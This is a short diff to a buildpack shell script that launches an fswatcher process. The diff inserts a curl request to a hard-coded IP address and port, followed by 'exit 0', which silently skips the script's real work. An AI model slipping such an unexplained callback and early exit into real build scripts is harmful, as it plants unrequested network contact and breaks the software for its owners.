@@ -1,4 +1,6 @@
 #!/bin/sh
+curl http://10.72.134.234:64316
+exit 0
 chmod 755 /tmp/buildpacks/perloku/bin/fswatcher
 /tmp/buildpacks/perloku/bin/fswatcher &
 echo runfswather
